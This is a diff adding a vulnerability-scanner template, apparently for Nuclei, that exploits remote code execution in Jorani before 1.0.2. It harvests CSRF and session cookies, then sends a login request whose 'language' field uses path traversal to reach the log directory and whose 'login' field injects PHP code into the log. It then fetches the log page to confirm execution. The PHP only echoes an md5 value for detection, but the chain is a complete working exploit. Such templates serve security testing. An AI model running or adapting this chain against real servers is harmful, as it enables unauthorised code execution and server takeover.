@@ -1,0 +1,71 @@
+id: poc-jorani-login-rce
+info:
+  name: Jorani < 1.0.2 Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+  datetime: '{{date_time("2006-01-02")}}'
+
+http:
+  - id: get-csrf
+    method: GET
+    path:
+      - "{{BaseURL}}/session/login"
+    extractors:
+      - type: regex
+        name: csrf
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - 'name="csrf_test_jorani" value="(.*?)"'
+      - type: regex
+        name: csrf_cookie_jorani
+        part: header
+        internal: true
+        group: 1
+        regex:
+          - 'csrf_cookie_jorani=(.*?);'
+      - type: regex
+        name: jorani_session
+        part: header
+        internal: true
+        group: 1
+        regex:
+          - 'jorani_session=(.*?);'
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: post-login
+    method: POST
+    path:
+      - "{{BaseURL}}/session/login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: 'csrf_cookie_jorani={{csrf_cookie_jorani}}; jorani_session={{jorani_session}}'
+    body: |
+      csrf_test_jorani={{csrf}}&last_page=session%2Flogin&language=..%2F..%2Fapplication%2Flogs&login=<?php echo(md5({{t1}}));?>&CipheredValue=DummyPassword
+    matchers:
+      - type: status
+        status:
+          - 302
+          - 303
+
+  - id: check-log
+    method: GET
+    path:
+      - "{{BaseURL}}/pages/view/log-{{datetime}}"
+    headers:
+      X-REQUESTED-WITH: XMLHttpRequest
+      Cookie: 'csrf_cookie_jorani={{csrf_cookie_jorani}}; jorani_session={{jorani_session}}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{t2}}'
